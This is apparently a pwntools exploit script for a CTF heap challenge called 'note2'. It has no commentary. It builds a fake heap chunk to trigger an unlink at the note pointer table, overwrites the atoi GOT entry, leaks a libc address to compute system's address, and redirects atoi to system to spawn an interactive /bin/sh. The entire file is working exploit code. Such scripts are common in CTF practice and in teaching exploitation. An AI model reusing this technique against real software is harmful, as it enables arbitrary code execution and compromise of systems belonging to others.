# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')

p = process("./note2")
elf = ELF("./note2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)

def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))

def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)

def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))

p.recvuntil("Input your name:")
p.sendline("aa")
p.recvuntil("Input your address:")
p.sendline("bb")
#gdb.attach(p)
head = 0x602120
newnote(0,"")
newnote(0x30,"")
newnote(0x80,"")
payload =p64(0)*3+p64(0x41)+p64(0)+p64(0x21)+p64(head+0x8-0x18)+p64(head+0x8-0x10)+p64(0x20)+p64(0)+p64(0x30)+p64(0x90)
deletenote(0)
newnote(0, payload)
deletenote(2)

payload = "a"*0x10 + p64(elf.got["atoi"])
editnote(1,2,payload)

shownote(0)
p.recvuntil("Content is ")
x=p.recv(6)
atoiaddr = u64(x+2*"\x00")
log.success(hex(atoiaddr))

libcbase = atoiaddr - libc.symbols["atoi"]
system_addr = libcbase + libc.symbols["system"]

payload=p64(system_addr)
editnote(0,1,payload)
p.sendline("/bin/sh")
p.clean()
p.interactive()
